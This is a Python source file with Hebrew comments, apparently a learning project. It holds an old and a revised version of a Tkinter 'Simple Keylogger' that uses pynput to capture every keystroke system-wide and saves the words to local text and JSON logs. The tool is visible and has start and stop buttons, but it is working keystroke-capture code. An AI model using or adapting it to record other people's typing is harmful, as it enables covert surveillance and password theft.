# from tkinter import Tk, Button, Label, Text, Scrollbar, END, RIGHT, Y, LEFT, BOTH
# from pynput import keyboard
# import os
# import json
#
# # משתנים גלובליים
# buffer = ""       # מילה זמנית
# keys = ""         # כל המילים שנקלטו
# listener = None   # מאזין למקלדת
#
# # תיקיות וקבצים
# LOG_DIR = "./out"
# if not os.path.exists(LOG_DIR):
#     os.makedirs(LOG_DIR)
#
# TEXT_FILE = os.path.join(LOG_DIR, "simple_log.txt")
# JSON_FILE = os.path.join(LOG_DIR, "key_log.json")
#
#
# # פונקציות שמירה
# def write_to_text_file(text: str):
#     with open(TEXT_FILE, "w", encoding="utf-8") as f:
#         f.write(text)
#
#
# def write_to_json_file(text: str):
#     words = [word for word in text.split("\n") if word]
#     with open(JSON_FILE, "w", encoding="utf-8") as f:
#         json.dump(words, f, ensure_ascii=False, indent=4)
#
#
# # מאזין למקשים
# def on_press(key):
#     global keys, buffer
#
#     try:
#         char = key.char
#     except AttributeError:
#         char = str(key)
#
#     if char in [" ", "Key.space", "Key.enter"]:  # סוף מילה
#         if buffer:
#             keys += buffer + "\n"
#             update_display(keys)
#             write_to_text_file(keys)
#             write_to_json_file(keys)
#             buffer = ""
#     elif len(char) == 1:
#         buffer += char
#
#
# # פונקציות של הכפתורים
# def start_keylogger():
#     global listener
#     listener = keyboard.Listener(on_press=on_press)
#     listener.start()
#     status_label.config(text="[+] Keylogger is running...", fg="green")
#     start_button.config(state="disabled")
#     stop_button.config(state="normal")
#
#
# def stop_keylogger():
#     global listener
#     if listener:
#         listener.stop()
#     status_label.config(text="[-] Keylogger stopped.", fg="red")
#     start_button.config(state="normal")
#     stop_button.config(state="disabled")
#
#
# # עדכון התצוגה בחלון
# def update_display(text):
#     text_box.delete("1.0", END)
#     text_box.insert(END, text)
#
#
# # --- יצירת הממשק הגרפי ---
# root = Tk()
# root.title("📜 Simple Keylogger")
# root.geometry("500x400")
# root.configure(bg="#f0f4f7")
#
# # כותרת
# title_label = Label(root, text="Simple Keylogger", font=("Arial", 16, "bold"), bg="#f0f4f7")
# title_label.pack(pady=10)
#
# # סטטוס
# status_label = Label(root, text='Click "Start" to begin logging...', font=("Arial", 12), bg="#f0f4f7")
# status_label.pack(pady=5)
#
# # תיבת טקסט עם סקרול
# text_box = Text(root, wrap="word", font=("Consolas", 12), height=12, width=50, bg="white", fg="black")
# text_box.pack(side=LEFT, padx=10, pady=10, fill=BOTH, expand=True)
#
# scrollbar = Scrollbar(root, command=text_box.yview)
# scrollbar.pack(side=RIGHT, fill=Y)
# text_box.config(yscrollcommand=scrollbar.set)
#
# # כפתורים
# start_button = Button(root, text="▶ Start", command=start_keylogger, bg="#4CAF50", fg="white",
#                       font=("Arial", 12), width=10)
# start_button.pack(pady=5)
#
# stop_button = Button(root, text="■ Stop", command=stop_keylogger, bg="#f44336", fg="white",
#                      font=("Arial", 12), width=10, state="disabled")
# stop_button.pack(pady=5)
#
# # הפעלת הממשק
# root.mainloop()



from tkinter import Tk, Button, Label, Text, Scrollbar, END, RIGHT, Y, LEFT, BOTH
from pynput import keyboard
import os
import json

# משתנים גלובליים
buffer = ""       # מילה זמנית
keys = ""         # כל המילים שנקלטו
listener = None   # מאזין למקלדת

# תיקיות וקבצים
LOG_DIR = "./out"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

TEXT_FILE = os.path.join(LOG_DIR, "simple_log.txt")
JSON_FILE = os.path.join(LOG_DIR, "key_log.json")


# פונקציות שמירה
def write_to_text_file(new_word: str):
    """שמירה לקובץ טקסט - הוספה להיסטוריה"""
    with open(TEXT_FILE, "a", encoding="utf-8") as f:
        f.write(new_word)


def write_to_json_file(all_text: str):
    """שמירה לקובץ JSON כהיסטוריה של מילים"""
    words = [word for word in all_text.split("\n") if word]
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(words, f, ensure_ascii=False, indent=4)


# מאזין למקשים
def on_press(key):
    global keys, buffer

    try:
        char = key.char
    except AttributeError:
        char = str(key)

    if char in [" ", "Key.space", "Key.enter"]:  # סוף מילה
        if buffer:
            keys += buffer + "\n"
            update_display(keys)
            write_to_text_file(buffer + "\n")
            write_to_json_file(keys)
            buffer = ""
    elif char == "Key.backspace":  # מחיקה
        buffer = buffer[:-1]
        update_display(keys + buffer)
    elif len(char) == 1:  # תו רגיל
        buffer += char
        update_display(keys + buffer)


# פונקציות של הכפתורים
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    status_label.config(text="[+] Keylogger is running...", fg="green")
    start_button.config(state="disabled")
    stop_button.config(state="normal")


def stop_keylogger():
    global listener
    if listener:
        listener.stop()
    status_label.config(text="[-] Keylogger stopped.", fg="red")
    start_button.config(state="normal")
    stop_button.config(state="disabled")


# עדכון התצוגה בחלון
def update_display(text):
    text_box.delete("1.0", END)
    text_box.insert(END, text)


# סגירה נקייה של החלון
def on_closing():
    stop_keylogger()
    root.destroy()


# --- יצירת הממשק הגרפי ---
root = Tk()
root.title("📜 Simple Keylogger")
root.geometry("500x400")
root.configure(bg="#f0f4f7")

# כותרת
title_label = Label(root, text="Simple Keylogger", font=("Arial", 16, "bold"), bg="#f0f4f7")
title_label.pack(pady=10)

# סטטוס
status_label = Label(root, text='Click "Start" to begin logging...', font=("Arial", 12), bg="#f0f4f7")
status_label.pack(pady=5)

# תיבת טקסט עם סקרול
text_box = Text(root, wrap="word", font=("Consolas", 12), height=12, width=50, bg="white", fg="black")
text_box.pack(side=LEFT, padx=10, pady=10, fill=BOTH, expand=True)

scrollbar = Scrollbar(root, command=text_box.yview)
scrollbar.pack(side=RIGHT, fill=Y)
text_box.config(yscrollcommand=scrollbar.set)

# כפתורים
start_button = Button(root, text="▶ Start", command=start_keylogger, bg="#4CAF50", fg="white",
                      font=("Arial", 12), width=10)
start_button.pack(pady=5)

stop_button = Button(root, text="■ Stop", command=stop_keylogger, bg="#f44336", fg="white",
                     font=("Arial", 12), width=10, state="disabled")
stop_button.pack(pady=5)

# טיפול בסגירת החלון
root.protocol("WM_DELETE_WINDOW", on_closing)

# הפעלת הממשק
root.mainloop()

